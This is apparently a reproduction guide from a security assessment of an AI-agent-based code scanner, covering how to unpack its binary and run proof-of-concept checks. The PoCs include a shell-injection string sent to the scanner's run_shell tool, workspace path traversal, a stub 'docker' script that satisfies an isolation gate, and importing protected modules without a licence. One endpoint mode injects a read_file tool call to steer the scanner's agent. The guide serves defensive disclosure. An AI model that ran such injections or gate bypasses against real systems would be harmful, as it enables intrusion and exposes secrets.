Already have a copy somewhere but not sure where? Search for it — this also
covers the Windows drives under WSL:

```bash
find "$HOME" /mnt /tmp -maxdepth 6 -name 'signal-pyarmor-linux-x86_64*' -size +50M 2>/dev/null
```

`poc/00-setup.sh` looks for the binary in the work directory, the current
directory, the repository root and `$HOME`, in that order, so with it in place
you can run the script from anywhere without `--binary`. If you pass `--binary`,
a relative path is resolved against the **current directory** — use an absolute
path when in doubt.

## 2. Unpack the PyInstaller archive

```bash
python3 -m venv /tmp/venv/pyenv
/tmp/venv/pyenv/bin/pip install pyinstxtractor-ng

cd "$WORK"
/tmp/venv/pyenv/bin/pyinstxtractor-ng signal-pyarmor-linux-x86_64
```

Takes a couple of seconds and yields `signal-pyarmor-linux-x86_64_extracted/`
with **123 top-level entries** and **6,379 modules** under `PYZ.pyz_extracted/`.

The archive is **not encrypted**, so no key is needed. Expect 17 warnings of the
form `[!] Warning: Empty file PYZ.pyz_extracted/…pyc`: for each, the extractor
writes a 16-byte header-only stub (`f3 0d 0d 0a` + 12 zero bytes) instead of the
package. Those stubs are handled next.

## 3. Repair the namespace-package markers

`pyinstxtractor-ng` writes a header-only stub `.pyc` for every namespace
package, *including* ones that also exist as a real directory. The stub shadows
the package, so `import langgraph`, `import google`, `import opentelemetry` and
friends fail. Delete the stub whenever a directory of the same name exists:

```bash
cd "$WORK"
python3 - <<'EOF'
import os
root = "signal-pyarmor-linux-x86_64_extracted"
removed = []
for dirpath, dirnames, _files in os.walk(root):
    for d in dirnames:
        stub = os.path.join(dirpath, d + ".pyc")
        if os.path.exists(stub) and os.path.getsize(stub) <= 32:
            os.remove(stub)
            removed.append(os.path.relpath(stub, root))
print("removed %d namespace-package markers" % len(removed))
for r in removed:
    print("   ", r)
EOF
# removed 17 namespace-package markers
```

## 4. Build the merged import tree

PyInstaller splits a package across two locations: extension modules (`.so`) stay
at the CArchive root, pure-Python modules live in the extracted PYZ. Both halves
must be visible under one directory or `numpy`, `faiss` and `tiktoken` cannot
import. `poc/01` merges them **recursively**, leaving the extraction untouched
and exposing each leaf by symlink, hard link or copy — whichever your filesystem
allows (`MERGE_LINK=symlink|hardlink|copy` forces one):

```bash
cd "$WORK"
SIGNAL_EXTRACT="$WORK/signal-pyarmor-linux-x86_64_extracted" \
MERGED_OUT="$WORK/merged" \
python3 /path/to/VAPT/poc/01-build-merged-tree.py
# merged entries at top level: 318
# leaf strategy: symlink
```

The output directory's parents are created if missing, and `SIGNAL_EXTRACT` is
validated up front. On Windows, set both variables to Windows paths — the
`/tmp/vapt` defaults are POSIX paths and silently become `\tmp\vapt` on the
current drive.

One level of merging is not enough — `numpy/_core` exists on both sides, and a
non-recursive merge hides `numpy`'s extension modules.

## 5. Build the reconstructed interpreter host

```bash
cd "$WORK"
gcc -o py313host /path/to/VAPT/poc/02-rebuild-cpython-host.c -ldl
```

`py313host` `dlopen()`s the `libpython3.13.so.1.0` shipped inside the binary and
runs a script with it, so product modules run on the interpreter they were built
for. `poc/00-setup.sh` compiles the path of the extraction it just built into the
host, and the host additionally searches — `$PY313_LIB`, `$SIGNAL_EXTRACT`, the
directory holding the host binary and its parent, the working directory, and the
assessment's path — looking for `libpython3.13.so.1.0` either directly or inside
any `*_extracted` subdirectory. So nothing needs to be exported for it, whether
the host sits next to the extraction or is run from elsewhere. To see which
library a given invocation loaded:

```bash
PY313_VERBOSE=1 ./py313host poc/08-collect-runtime-versions.py
# py313host: using /home/you/VAPT/signal-pyarmor-linux-x86_64_extracted/libpython3.13.so.1.0
```

`PY313_LIB=/path/to/libpython3.13.so.1.0` names it explicitly and always wins. If
no library can be found the host prints every location it looked in.

```bash
mkdir -p "$WORK/pyhome"            # an empty PYTHONHOME keeps the host's stdlib out
export PYTHONPATH="$WORK/merged:$WORK/signal-pyarmor-linux-x86_64_extracted/base_library.zip"
export PYTHONHOME="$WORK/pyhome"
export PYTHONIOENCODING=utf-8

./py313host /path/to/VAPT/poc/08-collect-runtime-versions.py
# python        : 3.13.5 (main, Jul 11 2025, 22:43:46) [Clang 20.1.4 ]
# ssl           : OpenSSL 3.0.16 11 Feb 2025
# zlib (module) : 1.3.1 | runtime: 1.3.1
# numpy         : 2.3.5
# faiss         : 1.12.0
# tiktoken      : 0.12.0
# certifi       : 2025.01.31
```

If that prints versions, the environment is good.

> **Do not export `PYTHONHOME`/`PYTHONPATH` for the system `python3`** — it
> aborts with `bad magic number in 'encodings'`. Set them only for `py313host`,
> and run the system-Python scripts as
> `env -u PYTHONHOME -u PYTHONPATH python3 …`. The `py3` alias below does that.

---

## 6. Run the PoCs

```bash
export WORK=/tmp/vapt
export SIGNAL_EXTRACT="$WORK/signal-pyarmor-linux-x86_64_extracted"
export POC=/path/to/VAPT/poc

# for the py313host scripts only:
export PYTHONPATH="$WORK/merged:$SIGNAL_EXTRACT/base_library.zip"
export PYTHONHOME="$WORK/pyhome"

# for the system-python scripts:
alias py3='env -u PYTHONHOME -u PYTHONPATH python3'
```

### Static — no product code executed, no LLM endpoint needed

| # | Command | Finding | Verified output |
|---|---|---|---|
| 09 | `./py313host $POC/09-check-advisory-ranges.py` | F-11, F-12 | `bundled components inside a published affected range: 6` |
| 10 | `./py313host $POC/10-introspect-protected-module.py` | F-03 | docstrings, `classes: 22`, full signatures for a protected module |
| 11 | `py3 $POC/11-analyse-pockit-endpoint.py` | F-15 | `POCKIT_LLM_BASE_URL`, `https://llm.labs.blackduck.com`, `ANTHROPIC_API_KEY` |
| 12 | `py3 $POC/12-disassemble-pyc.py pockit/agents/shared_tools.pyc run_shell` | F-01 | the `run_shell` docstring, `120`, and `('shell', 'capture_output', 'text', 'timeout', 'cwd')` |

`poc/11` and `poc/12` locate the extraction the same way `poc/01` does —
`$SIGNAL_EXTRACT`, the current directory, the repository root, then the
assessment's path — so the lines above work from any directory, with or without
the exports. `poc/12` resolves a relative argument under
`<extraction>/PYZ.pyz_extracted/`, and says which directory it used when it
cannot find the file.

### Dynamic — imports the shipped product code

| # | Command (see the footnote below) | Finding | Verified output |
|---|---|---|---|
| 03 | `./py313host $POC/03-armored-module-survey.py` | F-03, F-14 | `62 / 62 imported`, `0 raised`, `3049 strings`, `4652 identifiers` — **with no licence file present** |
| 04 | `./py313host $POC/04-protected-metadata-dump.py` | F-03 | `total harvested entries: 14344` → `analysis/protected_harvest.tsv` beside the extraction (`$ANALYSIS_OUT` overrides it) |
| 05 | `./py313host $POC/05-poc-f01-host-shell.py` | **F-01** | `uid=1001(user) …`, hostname `e2b.local`, `[+] host file /tmp/pockit-poc-escape-proof created: True` |
| 06 | `./py313host $POC/06-poc-f02-workspace.py --extract $SIGNAL_EXTRACT` | **F-02** | escaped workspace created from a traversing GUID; planted symlink adopted; fresh workspace mode `0o755` |

These four run through `py313host`, so they need the
`PYTHONHOME`/`PYTHONPATH` exports from §6.

`poc/05` registers the shipped `run_shell` tool with `shell=True, write=True` and
sends it `id; echo injected > /tmp/pockit-poc-escape-proof; cat /etc/hostname`.
That is the whole finding — the command runs through
`subprocess.run(..., shell=True)` in the scanning process's own namespace. It is
safe to run, but read it first; the same code path is what an agent drives.

### Dynamic — needs the real binary

| # | Scenario | Finding |
|---|---|---|
| 07 | `--llm-ssl-verify false` against a self-signed endpoint | **F-06** |
| 13 | What a scan actually sends to the LLM | **F-16** |
| 15 | PoCKit's Docker gate, credential and endpoint | **F-15** |

First, two things every scan needs — skipping either produces a confusing
failure:

```bash
cd "$WORK"
mkdir -p poc-target home
printf 'def add(a, b):\n    return a + b\n' > poc-target/util.py

# (1) the tokenizer cache (see "The tokenizer dependency" below)
mkdir -p tkcache/cached
cp <seeded-cache>/9b5ad71b2ce5302211f9c61530b329a4922fc6a4 tkcache/cached/

# (2) a byo config. In byo mode the *per-agent* models are mandatory:
#     `--llm-uri` alone exits 117 with "--llm-singlefilescan-agent-model is
#     required in byo mode", once per agent.
cat > poc-byo.signal <<'EOF'
[LLM]
mode = byo
uri = http://127.0.0.1:8899/v1
key = CANARY_KEY_123
model = poc-model

[LLM_SINGLEFILESCAN_AGENT]
model = poc-model
[LLM_DATAFLOW_AGENT]
model = poc-model
[LLM_OVERSIGHT_AGENT]
model = poc-model
[LLM_EXPLOITATION_AGENT]
model = poc-model
[LLM_SCA_AGENT]
model = poc-model
[LLM_MERGEKEY_EMBED_AGENT]
model = poc-model
[LLM_OVERSIGHT_EMBED_AGENT]
model = poc-model
EOF
```

**F-06 — `--llm-ssl-verify false` accepts an untrusted certificate.**

```bash
cd "$WORK"
# the endpoint hard-codes these two filenames:
openssl req -x509 -newkey rsa:2048 -nodes -days 2 \
  -keyout poc-f06-selfsigned.key -out poc-f06-selfsigned.pem \
  -subj "/CN=poc-f06-untrusted" -addext "subjectAltName=IP:127.0.0.1"

# start this with a process manager or a second shell (see the note below)
python3 $POC/07-poc-f06-tls-endpoint.py 8443 "$WORK/poc-f06-requests.log"

# the listener is dual-protocol: the first byte decides. A TLS ClientHello is
# served with the self-signed certificate (the F-06 path, unchanged); anything
# else is answered as plain HTTP, which is what makes the same port usable in a
# browser preview (the platform proxy speaks plain HTTP to the sandbox).
curl -k https://127.0.0.1:8443/v1/models    # PoC path
curl    http://127.0.0.1:8443/              # request log as an HTML page

# a config pointing at the HTTPS endpoint
sed 's#http://127.0.0.1:8899/v1#https://127.0.0.1:8443/v1#' poc-byo.signal > poc-byo-tls.signal
: > poc-f06-requests.log

# verification ON -> refused, nothing reaches the endpoint
HOME=$WORK/home ./signal-pyarmor-linux-x86_64 --config ./poc-byo-tls.signal \
  --llm-ssl-verify true --llm-timeout 10 --check-llm-json true ./poc-target
# exit 1 — "...summary": {"passed": 0, "failed": 7 …}; 5 chat agents report
#          error_code 111, "Connection error."
wc -l < poc-f06-requests.log     # 0

# verification OFF -> the same endpoint is accepted, key and all
HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
  ./signal-pyarmor-linux-x86_64 --config ./poc-byo-tls.signal \
  --llm-ssl-verify false --llm-timeout 10 --check-llm-json true ./poc-target
# exit 1 — "summary": {"passed": 5, "failed": 2 …}, every chat agent "ok"
wc -l < poc-f06-requests.log     # 7
python3 -c "
import json
for i, l in enumerate(open('poc-f06-requests.log')):
    d = json.loads(l); print(i, d['method'], d['path'], d['headers']['Authorization'])"
# 0 POST /v1/chat/completions Bearer CANARY_KEY_123
# …
# 5 POST /v1/embeddings       Bearer CANARY_KEY_123
# 6 POST /v1/embeddings       Bearer CANARY_KEY_123
```

Reading the numbers. In the first run all **seven** agents fail with
`error_code 111, "Connection error."` — the certificate is refused, and nothing
is logged. In the second run the five chat agents succeed and **all seven**
agents' requests arrive at the endpoint, including the two embedding POSTs.
Only five arrive if the tokenizer cache is missing, because the embedding agents
then fail on the `cl100k_base` fetch (F-05) *before* dialling — so the count at
the endpoint depends on F-05, not on the TLS setting. The `failed: 2` in the
second run is also not a TLS result: this minimal PoC endpoint answers every path
with a chat-completion body, which an embeddings client cannot parse, so those
two report `error_code: 63` after their request has already been delivered and
logged.

`--check-llm-json` sends a small probe rather than source code, so the captured
bodies are ~105 bytes; this PoC is about the *channel*. F-16 covers the payload.

> **Don't background the listener with `&` inside a shell that then exits** — the
> process outlives the shell, keeps the port, and a later start fails with
> `Errno 98`. Use a process manager, `nohup` in a persistent session, or a second
> terminal, and kill it when you are done.

**F-16 — the scan sends source verbatim, credentials included.**

The single-file analysis stage puts each file's text straight into the prompt, so
a scan imports nothing and is pointed at a directory of source. Two conditions
have to hold for the request to leave the machine: the file has to be *discovered*
(see the `.gitignore` caveat below) and the endpoint must not already have a
cached answer for that exact prompt — the runner passes `--caching false` for
that reason.

```bash
cd "$WORK"
# the target must not sit inside a checkout that ignores it - see the caveat below
TRIAGE=$(mktemp -d)/poc-triage && mkdir -p "$TRIAGE"
printf 'API_KEY = "AKIAIOSFODNN7EXAMPLE"\nDB_PASSWORD = "sup3r-s3cret-db-pass"\n' \
  > "$TRIAGE/secret_sample.py"

python3 $POC/13-capture-llm-payload.py 8899 "$WORK/poc-f16-payload.log"   # second shell

HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
  ./signal-pyarmor-linux-x86_64 "$TRIAGE" --config ./poc-byo.signal \
  --llm-mode byo --llm-uri http://127.0.0.1:8899/v1 --llm-key CANARY_KEY_123 \
  --caching false                  # exit 0; "Identified 1 files for analysis"

grep -c 'BODY (' poc-f16-payload.log                       # 23–25 requests captured
grep -c AKIAIOSFODNN7EXAMPLE poc-f16-payload.log            # non-zero: the file text, once per attempt
grep -o 'redacted sha256=[0-9a-f]*' poc-f16-payload.log | sort -u
# one fingerprint — sha256("Bearer CANARY_KEY_123")[:12] = 6424c7a76ff3 — which is how
# credential headers are logged: provable, without storing the credential
```

The counts scale with how much the run does; the finding does not. The prompt
text is the point:

```
## SOURCE CODE
```
1: API_KEY = "AKIAIOSFODNN7EXAMPLE"
2: DB_PASSWORD = "sup3r-s3cret-db-pass"
```
```

A `.gitignore` caveat belongs to this finding, because it decides what is
analysed at all. File discovery honours git's ignore file, and it says so only
obliquely — the same scanner, given a directory that git ignores, reports:

```bash
grep -rl . --include='*.py' poc-target        # files are there
HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
  ./signal-pyarmor-linux-x86_64 ./poc-target --config ./poc-byo.signal \
  --llm-mode byo --llm-uri http://127.0.0.1:8899/v1 --llm-key CANARY_KEY_123 --caching false
# WARNING: scans.sast : No files found for analysis in ./poc-target
# INFO   : scans.sast : Identified 0 files for analysis
```

So a `poc-target/` you create by hand inside this repository is skipped — this
is why the runner keeps its scan target under `$TMPDIR`, outside the checkout
altogether (`mktemp -d`), and why its deliberately-ignored `poc-target/` exists
only for the second half of this check. If the directory you point a scan at
lives in a checkout that ignores it, the scan reports `Identified 0 files for
analysis` and sends nothing at all — a silent coverage gap, and the reason this
check can otherwise fail with no visible cause.

The opposite asymmetry is worth checking too: the tool's **own** credential is
redacted in its log (`--llm-key=********`), while the credential literals inside
the analysed file are not.

`13-capture-llm-payload.py` has one more mode: `--agentic <file>` answers a
request that advertises the scanner's own `read_file` tool with a tool call for
that file, which models an endpoint the operator does not fully trust. The
packaged binary did **not** act on that call in the assessment environment, so
nothing in the report rests on it; header values are recorded as
`<redacted sha256=…>` fingerprints either way, which is how `run-all.sh` proves
that PoCKit sent the command-line key without storing the key.

**F-15 — PoCKit's Docker "isolation" is a `PATH` lookup.**

```bash
cd "$WORK"
command -v docker        # not installed in the assessment environment

HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" \
  ./signal-pyarmor-linux-x86_64 ./poc-target --config ./poc-byo.signal \
  --poc-kit true --dataflow true --synthesis true --agent-limit 1
# INFO : scans.sast  : Sending 0 exploitable_dataflow findings to PoCKit...
# ERROR: utils.results: PoCKit requires Docker but the 'docker' binary was not
#                      found. Install Docker and retry.

printf '#!/bin/sh\necho "Docker version 27.0.0-stub"\n' > docker && chmod +x docker
HOME=$WORK/home TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached" PATH="$WORK:$PATH" \
  ./signal-pyarmor-linux-x86_64 ./poc-target --config ./poc-byo.signal \
  --poc-kit true --dataflow true --synthesis true --agent-limit 1
# exit 0 — the gate is satisfied by three lines of shell
```

The gate is `shutil.which("docker")` plus a `docker info` call; it is not a
capability check. The other two F-15 behaviours — the mandatory
`ANTHROPIC_API_KEY` that none of the seven BYO credentials supply, and PoCKit
taking its endpoint from the global `--llm-uri` (default
`https://llm.core.blackduck.com/`) rather than the per-agent configuration —
need an actual finding to hand to PoCKit, so they are driven through
`--import-results` with a crafted SARIF. The exact commands and outputs are in
**F-15's PoC block** in the report, and `poc/13` doubles as the capture endpoint
for the PoCKit traffic (`POST /v1/messages`).

---

## The tokenizer dependency

**This is F-05 and it blocks every scan.** Before its first model call, each
embedding agent loads `cl100k_base` via `tiktoken`, which fetches
`https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken`
unless a cache already holds it. In an egress-restricted environment — i.e. most
security reviews — the fetch fails and the run reports `error_code 63` with that
host in the message. No documented CLI option changes the location, so the only
workarounds are an egress rule or a pre-seeded cache.

tiktoken's cache is **hash-pinned**: the cached filename is `sha1(blob_url)` and
the contents are verified against a compiled-in digest, so an empty or
hand-written placeholder file does **not** satisfy it. `poc/seed-tokenizer-cache.py`
does the whole job, using the tiktoken that ships inside the binary — so nothing
needs installing on your machine:

```bash
# run it through the reconstructed host (needs the step 5 exports)
./py313host poc/seed-tokenizer-cache.py                    # -> <extraction>/../tkcache/cached
./py313host poc/seed-tokenizer-cache.py /path/to/cache     # or anywhere you like

# it prints the directory to use:
#   status: ok
#   export TIKTOKEN_CACHE_DIR=/home/you/VAPT/tkcache/cached
```

Re-running it is safe — it verifies an existing file against the expected
SHA-256 and tells you if it is wrong. If *this* machine has no egress either, the
script says so (that is F-05 reproducing itself) and prints the file to fetch
elsewhere:

```bash
# on a host with egress
curl -fL -o tkcache/cached/9b5ad71b2ce5302211f9c61530b329a4922fc6a4 \
  https://openaipublic.blob.core.windows.net/encodings/cl100k_base.tiktoken

sha256sum tkcache/cached/*     # 223921b76ee99bde995b7ff738513eef100fb51d18c93597a113bcffe865b2a7
```

Copy `tkcache/` to the machine under test and point the run at
`TIKTOKEN_CACHE_DIR="$WORK/tkcache/cached"`. If the tokenizer is unreachable and
uncached, expect **zero** requests at your endpoint and `error_code: 63` — the
tool fails closed, which is correct behaviour and also why the seeded cache is
mandatory for the dynamic PoCs.

---

## Notes and caveats

- **The extracted tree is a derived artefact** — keep it outside the repository.
  Nothing in `poc/` writes into the extraction or into the binary.
- **`poc/05` and `poc/06` execute shipped product code**, including a shell tool.
  They run as you, on your machine. Read them before running them.
- **Protected function bodies stay encrypted.** All 62 protected modules import
  and yield 3,049 constants plus 4,652 identifiers (docstrings, class and method
  names, signatures, prompt text), but `co_code` remains PyArmor-encrypted, so
  do not expect source code from these scripts. `poc/12` reads the unprotected
  `pockit/` bytecode, where full disassembly is possible.
- **Advisory ranges drift.** `poc/09`'s ranges were correct on 2026-10-16;
  re-check them against your advisory source before relying on the verdicts.
- **`poc/09`, `10`, `03`, `04`, `05` and `06` need the repaired tree** from steps
  2–4. Every script finds that tree itself (`$SIGNAL_EXTRACT`, the working
  directory, the repository root), so only `PYTHONHOME`/`PYTHONPATH` have to be
  exported for the `py313host` scripts. If the extraction is stale or the markers were not removed, `poc/03` will
  report import failures instead of `62/62`.
- **Response caching hides requests, not findings.** A scan keeps an LLM response
  cache (`signal-cache.db` in the working directory); a repeat of an identical
  prompt is answered locally and never dials out. Every dynamic command in
  `poc/run-all.sh` therefore passes `--caching false`, so what you count at the
  endpoint is what the scan actually sent. Delete a stale `signal-cache.db` if
  you drive the binary by hand.
- **File discovery honours `.gitignore`** (see F-16): a directory git ignores
  yields `No files found for analysis` even when it is full of `.py` files. Keep
  scan targets in directories your checkout does not ignore.
- **The mock endpoints in `poc/07` and `poc/13` never forward anything** and bind
  `0.0.0.0`; they are throwaway local listeners, so run them on a trusted network
  or bind them to `127.0.0.1` in a shared environment.
